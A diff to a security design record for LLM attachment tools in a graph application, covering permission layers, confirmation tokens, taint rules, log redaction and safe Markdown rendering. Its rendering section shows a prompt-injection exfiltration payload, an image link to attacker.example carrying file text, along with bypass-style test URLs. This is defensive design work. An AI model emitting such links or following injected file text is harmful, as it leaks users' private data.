@@ -84,11 +84,28 @@ round. It does not implement anything.
   run history stores up to 500 characters of the run's final summary.
 - **Chat replies render Markdown with remote images.**
   `frontend/web/src/components/MarkdownMessage.jsx` renders assistant text
-  with `react-markdown` and no URL filter, so an image reference in a reply
-  is fetched by the browser as soon as the reply is shown.
+  with `react-markdown` and its default URL transform, which strips unsafe
+  protocols but lets any `http(s)` image source through, so an image
+  reference in a reply is fetched by the browser as soon as the reply is
+  shown.
 - **Tool arguments are logged.** `ChatProcessor` logs every tool call's full
   input at INFO (`Executing tool: … with input: …`), and the Agent tool
-  executor logs a summary of the arguments.
+  executor logs a summary of the arguments. Several error paths log or
+  return exception text (`str(e)`), which can quote argument values.
+- **Proposal decisions bind no request authorization.**
+  `POST /agents/proposals/{id}/approve` and `…/reject`
+  (`backend/api_host/agent_routes.py`) do not run inside
+  `use_request_authorization`, and applying an approved proposal runs the
+  captured tool without the gate.
+- **The Agent gate is optional in the worker.** `backend/agents/worker.py`
+  installs `filter_tool_definitions` and `AutonomyGate.wrap` only when a
+  proposal store is wired. `AgentRegistry` always wires one, but a worker
+  constructed without it runs every tool ungated.
+- **Kiosk writes are typed.** In collection mode,
+  `ChatService._make_enforced_tools` checks the collection's
+  `node_type_permissions` (`create`, `update`, `delete` per node type) for
+  node and edge writes, and records the ids of nodes the turn touched so that
+  `save_collection_response` can link the response to them.
 - **The default hook is permissive.** `DefaultGraphAuthorizationHook`
   allows everything unless `COMMUNITYOVERVIEW_AUTHORIZATION_MODE` narrows
   it to `read-only` or `deny-all`. A deployment that needs per-user rules installs
@@ -169,23 +186,32 @@ Common rules:
 - `attachment_id` must match `^[0-9a-f]{32}$` and be in the node's index,
   else `not_found`.
 - Errors are `{"success": false, "error": "<code>", "message": "<text>"}`.
-  Where ADR 0008 has a code for the condition (§4, §5, §7), the same code is
+  The `message` is a fixed text per code, never exception text, an argument
+  value or extracted content; an unexpected exception inside an attachment
+  tool is caught and returned as `failed` with its fixed message. Where ADR 0008 has a code for the condition (§4, §5, §7), the same code is
   used. The codes new in this ADR are `not_found` (where REST answers `404`),
-  `too_many_nodes`, `invalid_arguments`, `attachment_too_large_for_tool` and
-  `confirmation_required` (§5).
+  `too_many_nodes`, `invalid_arguments`, `attachment_too_large_for_tool`,
+  `busy` (no extraction slot, §1 `read_node_attachment`), `failed` (an
+  unexpected error) and `confirmation_required` (§5).
 - An authorization denial is the unchanged result of
   `access.build_access_denied_result`, with `"error_code": "access_denied"`,
   so `/execute_tool` keeps mapping it to `403`.
-- Every response that carries extracted text has `"untrusted_content": true`
-  and the envelope in §5.
+- Every response that carries extracted text or stored file names
+  (`list_node_attachments`, `read_node_attachment`,
+  `search_node_attachments`) has `"untrusted_content": true` and the
+  envelope in §5.
 
 #### `list_node_attachments(node_id)` — read
 
-Metadata only, no content. The REST list payload (ADR 0008 §7) plus
-`node_id`:
+Metadata only, no extracted content. The REST list payload (ADR 0008 §7)
+plus `node_id` and the envelope of §5: file names are free text chosen by
+whoever uploaded the file (up to 255 bytes), so a list response is
+untrusted content and taints the turn or run like a read does.
 
 ```json
 {
+  "untrusted_content": true,
+  "content_notice": "…",
   "node_id": "…",
   "attachments": [
     {"id": "3b1e…", "filename": "ai-policy.pdf", "size": 482113,
@@ -206,7 +232,13 @@ the REST list uses.
 Returns a window of one file's extracted text. `offset` counts characters
 into the file's extracted text (segments concatenated in document order, as
 the extractor emits them). `max_chars` is clamped to
-`ATTACHMENT_READ_MAX_CHARS`.
+`ATTACHMENT_READ_MAX_CHARS`. A negative `offset` or a `max_chars` below 1
+is `invalid_arguments`; an `offset` at or past `total_chars` returns empty
+`segments` and `next_offset: null`.
+
+If no extraction slot (§3) frees up within
+`ATTACHMENT_EXTRACT_TIMEOUT_SECONDS`, the call returns error `busy` with
+nothing cached, and the same call can be retried.
 
 ```json
 {
@@ -250,7 +282,8 @@ hits of a preceding `search_graph`.
   (500) characters; longer is `invalid_arguments`.
 - `node_ids`: 1 to `ATTACHMENT_SEARCH_MAX_NODES` (20) ids. More is error
   `too_many_nodes`; nothing is extracted.
-- `top_k`: 1 to `ATTACHMENT_SEARCH_MAX_TOP_K` (20); default 8.
+- `top_k`: default 8; a value below 1 is `invalid_arguments`, and the value
+  (the default included) is clamped to `ATTACHMENT_SEARCH_MAX_TOP_K` (20).
 
 ```json
 {
@@ -392,7 +425,16 @@ under `propose` and `act_after_approval` they become proposals and are not
 executed. There is no Agent level at which an attachment write runs without
 a human approval. When an approved proposal is applied, the service-layer
 checks (authorization hook, visibility, limits, type) run again at that
-time; the ceiling (`ATTACHMENT_CONTENT_ACCESS`) is re-checked too.
+time; the ceiling (`ATTACHMENT_CONTENT_ACCESS`) is re-checked too. So that
+the hook sees the approver, `POST /agents/proposals/{id}/approve` and
+`…/reject` run inside `use_request_authorization(headers=request.headers)`;
+that binding lands **before or with** the write tools.
+
+The worker applies the attachment rules whether or not a proposal store is
+wired: withholding ungranted attachment tools, the taint rule (§5) and the
+mutating classification. A worker without a proposal store has no way to
+make a proposal, so it refuses `add_node_attachment` and
+`delete_node_attachment` outright.
 
 #### Kiosks
 
@@ -403,6 +445,13 @@ unset or unreadable allowlist (including the fail-closed resolution path in
 `ChatService`, which leaves it `None`) gives no attachment tools.
 `ASSISTANT_ATTACHMENT_ACCESS` does not grant kiosks anything. The ceiling
 applies.
+
+A kiosk's attachment writes are also typed: the enforced tool overlay
+(`ChatService._make_enforced_tools`) gains entries for
+`add_node_attachment` and `delete_node_attachment` that refuse unless the
+target node's type has `update` in the collection's
+`node_type_permissions`. The overlay applies on the confirmation path too
+(§5).
 
 Because the kiosk is a client-selected mode of `/ui/chat` (Context), its
 allowlist governs what the kiosk's model is offered, not what a determined
@@ -442,7 +491,7 @@ per-node visibility on every call.
 |---|---|---|---|
 | Interactive assistant | `ASSISTANT_ATTACHMENT_ACCESS` | `read` — a named default set by D1, logged at boot; not inferred from a missing check | only with `read_write` |
 | Agent | `metadata.attachment_access`, and the allowlist when non-empty | `none` — no attachment tool, even with an empty allowlist | only with `read_write`, and then always a proposal or blocked |
-| Kiosk | non-empty `tool_allowlist` naming the tool | none — no attachment tool | only when the allowlist names the write tool |
+| Kiosk | non-empty `tool_allowlist` naming the tool | none — no attachment tool | only when the allowlist names the write tool and the target node's type has `update` in `node_type_permissions` |
 | External MCP client | `MCP_ATTACHMENT_TOOLS` | `off` — not registered | only with `read_write` |
 | `POST /execute_tool` | `MCP_ATTACHMENT_TOOLS` (same tool map), and authentication on | `off` — not in the map; with authentication off, refused as not in `SAFE_TOOLS` | only with `read_write` |
 
@@ -476,11 +525,26 @@ lxml's parser options, `lxml` gets its own minimum-pinned line in
   - `close_fds=True`, so it holds no server sockets or files;
   - an empty temporary working directory.
 
-  The child still runs as the same OS user, with the same filesystem and
-  network reach. The core does not sandbox it further; a deployment that
-  needs more puts the server in a container or under an OS sandbox. A parser
-  remote-code-execution bug is therefore contained against crashes, memory
-  exhaustion and secrets in the environment, not against the filesystem.
+  The clean environment stops secrets from being *inherited by accident*;
+  it is not a boundary. The child still runs as the same OS user, with the
+  same filesystem and network reach, so code running in it can read what
+  that user can read — the server's `.env` and secret files, and the
+  server process's own environment under `/proc` — and send it out. The
+  isolation therefore contains crashes and resource exhaustion (timeout,
+  memory cap, a killable process), not a parser remote-code-execution bug:
+  such a bug is a compromise of the server's OS user. The core does not
+  sandbox the child further. A deployment that must contain parser bugs
+  runs the server (or the extraction child) under a separate OS user or an
+  OS sandbox with no network and no access to its secrets; the deployment
+  documentation for the implementation states this requirement.
+- **The parent trusts nothing the child returns.** The parent reads at most
+  `ATTACHMENT_EXTRACT_MAX_OUTPUT_BYTES` from the child's stdout and at most
+  64 KiB (a fixed constant) from its stderr; more on either is `failed` and
+  the child is killed. The stdout JSON is validated against the expected
+  shape (segments of `{text, locator}` strings, a known status, a boolean
+  `truncated`), anything else is `failed`, and the character cap is
+  enforced again in the parent. stderr is discarded, never logged; the log
+  records only the status and the exit code.
 - **Wall-clock timeout.** The child is killed after the timeout, and the
   result is `timeout`.
 - **Memory cap.** The child runs under an address-space limit
@@ -503,8 +567,8 @@ lxml's parser options, `lxml` gets its own minimum-pinned line in
 
 #### Limits and settings
 
-Every limit is a setting; a value of `0` or less is refused at boot, never
-read as "unlimited". The one exception is `ATTACHMENT_CHUNK_OVERLAP_CHARS`,
+Every limit is a setting, except the fixed 64 KiB stderr cap above; a value
+of `0` or less is refused at boot, never read as "unlimited". The one exception is `ATTACHMENT_CHUNK_OVERLAP_CHARS`,
 which may be `0` and must be smaller than `ATTACHMENT_CHUNK_CHARS`, as
 `attachment_retrieval.chunk_segments` requires.
 
@@ -513,6 +577,7 @@ which may be `0` and must be smaller than `ATTACHMENT_CHUNK_CHARS`, as
 | `ATTACHMENT_EXTRACT_TIMEOUT_SECONDS` | `30` | wall clock per file (child process) |
 | `ATTACHMENT_EXTRACT_MEMORY_BYTES` | 1 GiB | address-space limit of the child |
 | `ATTACHMENT_EXTRACT_MAX_CHARS` | `1000000` | extracted characters per file; beyond it, `truncated` |
+| `ATTACHMENT_EXTRACT_MAX_OUTPUT_BYTES` | 16 MiB | bytes the parent reads from the child's stdout (UTF-8 JSON written without ASCII escaping, so at most 6 bytes per character, for up to `ATTACHMENT_EXTRACT_MAX_CHARS` characters plus locators); must be at least 8 × `ATTACHMENT_EXTRACT_MAX_CHARS`, checked at boot |
 | `ATTACHMENT_EXTRACT_MAX_UNCOMPRESSED_BYTES` | 100 MiB | declared uncompressed total of a ZIP-based file |
 | `ATTACHMENT_EXTRACT_MAX_ZIP_RATIO` | `100` | compression ratio, whole archive and per member |
 | `ATTACHMENT_EXTRACT_ZIP_RATIO_MIN_MEMBER_BYTES` | 1 MiB | members smaller than this (uncompressed) are exempt from the per-member ratio test, so small XML parts are not false positives |
@@ -531,6 +596,9 @@ which may be `0` and must be smaller than `ATTACHMENT_CHUNK_CHARS`, as
 | `ATTACHMENT_READ_MAX_CHARS` | `50000` | upper bound for `max_chars` in `read_node_attachment` |
 | `ATTACHMENT_TEXT_CACHE_MAX_CHARS` | `20000000` | in-memory LRU of extraction results, keyed by the file's SHA-256, per server process |
 | `ATTACHMENT_MCP_MAX_DECODED_BYTES` | `3000000` | decoded bytes accepted by `add_node_attachment` (§1) |
+| `ATTACHMENT_CONFIRMATION_TTL_SECONDS` | `600` | lifetime of a confirmation token (§5) |
+| `ATTACHMENT_PENDING_ACTIONS_PER_TURN` | `5` | pending actions one tainted turn may record (§5) |
+| `ATTACHMENT_PENDING_ACTIONS_MAX` | `1000` | pending actions held per server process, oldest evicted first (§5) |
 
 The extractor's input is already bounded by `ATTACHMENT_MAX_FILE_BYTES`
 (ADR 0008 §4). The chunking, re-rank and top-k defaults are those of
@@ -543,7 +611,10 @@ for the node being read. It holds the extraction result (segments, status,
 `truncated`), never bytes, is not persisted and is cleared on restart.
 Final non-`ok` results (`no_text_layer`, `unsupported_type`, `too_large`,
 `timeout`, `failed`) are cached too, so a file that times out is not
-re-extracted on every call; `skipped_budget` is never cached. Extraction
+re-extracted on every call. `timeout` here means only that the child
+process itself ran past `ATTACHMENT_EXTRACT_TIMEOUT_SECONDS`; time spent
+waiting for a slot never produces it. `skipped_budget` and `busy` are never
+cached. Extraction
 slots are shared by all callers of one process: a search that cannot get a
 slot before its own timeout reports the remaining files as `skipped_budget`
 rather than waiting. Two nodes holding the same file share one cache
@@ -593,6 +664,11 @@ that read or only change what the user's own view shows:
 - `search_graph`, `get_related_nodes`, `find_similar_nodes`,
   `find_similar_nodes_batch`, `list_node_types`, `get_subtypes`,
   `get_schema`, `get_presentation`, `list_saved_views`, `get_saved_view`;
+- the read-only tools of the Agents' `GRAPH` integration
+  (`MCPLoader._get_graph_mcp_tools`): `get_node_details`,
+  `get_graph_stats`, `get_capabilities`, `get_runtime_info`,
+  `get_tenant_context`, `get_config_context`, `get_request_actor`,
+  `get_request_scope`, `get_request_selection`;
 - `list_node_attachments`, `read_node_attachment`,
   `search_node_attachments`;
 - `propose_new_node` (formats a suggestion for the user; writes nothing),
@@ -604,9 +680,21 @@ Every other tool — every write (`add_nodes`, `update_node`, `delete_nodes`,
 `save_collection_response`, `add_node_attachment`,
 `delete_node_attachment`) and any tool added later — is refused with error
 `confirmation_required`. The server records a pending action: the exact
-tool name and arguments, a server-minted, single-use, short-lived token, and
-the caller context of the turn — caller kind, the resolved collection (for a
-kiosk), the effective allowlist and the request actor.
+tool name and arguments, a server-minted, single-use token, and the caller
+context of the turn — caller kind, the resolved collection (for a kiosk),
+the effective allowlist, the request actor and, for a kiosk, the ids of the
+nodes the turn touched (so a confirmed `save_collection_response` links to
+them as it would have in the turn).
+
+Pending actions are bounded. A token expires
+`ATTACHMENT_CONFIRMATION_TTL_SECONDS` (default `600`) after it is minted.
+One turn records at most `ATTACHMENT_PENDING_ACTIONS_PER_TURN` (default `5`);
+further refused calls in that turn get `confirmation_required` with no
+pending action. The in-memory store holds at most
+`ATTACHMENT_PENDING_ACTIONS_MAX` (default `1000`) per server process and
+evicts the oldest first. Pending actions are not persisted. An expired,
+evicted, already used or unknown token is refused by the confirmation
+route.
 
 - **What the model sees.** Its tool result carries only
   `confirmation_required` and a short message. The token and the bound
@@ -623,8 +711,9 @@ kiosk), the effective allowlist and the request actor.
   tool and arguments, once, inside `use_request_authorization` for the
   confirming request, through the same path the turn would have used: the
   §2 permission layers, the allowlist gate and, for a kiosk, the
-  collection's enforced tool overrides (its node-type permissions and
-  `save_collection_response`).
+  collection's enforced tool overrides (its node-type permissions, including
+  the typed attachment writes of §2, and `save_collection_response` with
+  the recorded touched node ids).
 
 The model can neither confirm an action nor produce a confirmation by
 writing text.
@@ -640,32 +729,48 @@ chat response therefore carries `untrusted_content_used: true` when its turn
 was tainted. The web client keeps that as a conversation-level flag and sends
 `conversation_tainted: true` with every later request of that conversation;
 the server treats such a request as tainted from its start. The client
-attaches it in the one shared request function (`api.sendChatMessage`) from
-per-conversation state, not at each call site, so every send path — chat,
-approve, reject, confirm and kiosk — carries it; a test covers each path.
-The flag lives in
+attaches it in the one shared request function (`api.sendChatMessage`),
+not at each call site. `sendChatMessage` is stateless today, so every call
+site passes a conversation key (`options.conversationId`); `api.js` keeps
+the taint flags in a module-level map by that key, sets the flag when a
+response carries `untrusted_content_used: true`, and sends it on every
+later request with the same key. The chat panel and the kiosk view each
+generate a fresh key when they start a new conversation (clearing the chat,
+opening a kiosk), which is what "a new conversation" means here. A test at
+the `api.js` level checks that a request without a key is refused by the
+function, and a test per component checks that every `sendChatMessage`
+call site — chat, approve, reject, confirm, form submit, kiosk messages and
+the kiosk kickstart — passes the conversation's key. The flag lives in
 the user's own client, which is adequate here: the adversary is the file
 content, not the user's browser, and a client that drops the flag removes
 protection only from its own user. A new conversation starts clean.
 
 **Rendering.** Assistant and kiosk replies are rendered without loading
 remote resources: the chat Markdown renderer
-(`MarkdownMessage.jsx`) allows image sources only from the application's
-own origin and `data:` URLs, and drops every other image. Without this, an
-injected passage could make the model write
-`![](https://attacker.example/?d=<file text>)` and the browser would send the
-text away as soon as the reply is shown, with no tool call involved. A
+(`MarkdownMessage.jsx`) loads an image only from a `data:image/…` URL and
+renders every other image as its alt text followed by its source URL as
+plain text, never fetched. Without this, an injected passage could make the
+model write `![](https://attacker.example/?d=<file text>)` and the browser
+would send the text away as soon as the reply is shown, with no tool call
+involved. Same-origin images are not allowed either:
+`![](/any-path?d=<file text>)` would put the text into this server's and
+any proxy's access logs, outside the redaction of §6. A
 Markdown link can do the same with one click, because its text can hide its
 target. So a link to another origin is rendered with its full target URL as
-visible text and with `rel="noreferrer noopener"`. A test renders a reply
-with a remote image and an off-origin link and checks both rules. This
+visible text and with `rel="noreferrer noopener"`. "Another origin" is
+decided by resolving the URL against the page and comparing scheme, host
+and port. A test renders replies with a remote image, a same-origin image
+with a query string, and off-origin links written as absolute,
+protocol-relative (`//attacker.example/x`), backslash (`/\attacker.example`)
+and same-host-other-port URLs, and checks both rules for each. This
 change lands **before or with** the read tools.
 
 **Agents.** Every mutating `GRAPH` tool is already blocked or turned into a
 proposal (§2), so a human sees each write before it applies. That does not
 cover egress: `WEB__fetch` and the search integration count as read-only and
 run unattended, and so would any integration kind added later. So a taint
-rule applies per Agent run, enforced in `AutonomyGate.wrap`: once any tool
+rule applies per Agent run, enforced in `AutonomyGate.wrap` (which the
+worker installs with or without a proposal store, §2): once any tool
 result in the run has `untrusted_content: true`,
 
 - every tool outside the `GRAPH` integration is refused for the rest of the
@@ -713,14 +818,21 @@ this. The sites that write tool arguments or model text are:
 
 - `ChatProcessor`'s tool-call line (`Executing tool: … with input: …`, full
   input at INFO) in `backend/ui/chat_logic.py`;
+- `ChatProcessor`'s tool-error paths, which put `str(e)` into the tool
+  result and the log, in `backend/ui/chat_logic.py`;
 - `MCPLoader`'s tool-call line and its graph-tool error line, both through
-  `_summarize_args`, in `backend/agents/mcp_loader.py`;
+  `_summarize_args`, its `Tool … returned error: …` line after dispatch,
+  and `_execute_graph_tool`'s `str(e)` result, in
+  `backend/agents/mcp_loader.py`;
+- the Agent LLM client's `Tool … failed: …` warning in
+  `backend/agents/llm_client.py`;
 - the Agent worker's execution trace (tool inputs, per-turn reasoning, final
   response) in `backend/agents/worker.py`.
 
 At each of them, the five attachment tools are always logged by name and
 argument sizes only (`query` length, `content_text`/`content_base64`
-length), and no line records an attachment tool's result. In a tainted turn
+length), and no line records an attachment tool's result or exception
+text; their errors carry only the code and its fixed message (§1). In a tainted turn
 or run (§5), every tool call is logged that way, and reasoning and response
 text are not logged. A regression test covers every site.
 
@@ -754,8 +866,10 @@ binary bodies; the tools avoid it with bounded text or base64 arguments.
 
 - **New trust path.** Stored file text enters LLM context. The controls are
   the permission layers (§2), the envelope, taint guard and rendering rule
-  (§5), the extraction isolation (§3) and the audit record and log redaction
-  (§6). The egress channels considered are: tool calls that write or reach
+  (§5), the extraction isolation (§3; it contains crashes and resource
+  exhaustion, not a parser code-execution bug, which a deployment contains
+  with a separate OS user or sandbox) and the audit record and log
+  redaction (§6). The egress channels considered are: tool calls that write or reach
   the network (§5), images in rendered replies (§5), logs (§6), and the
   model's own reply text, which reaches only the user and the configured
   provider (D1). The repository has no
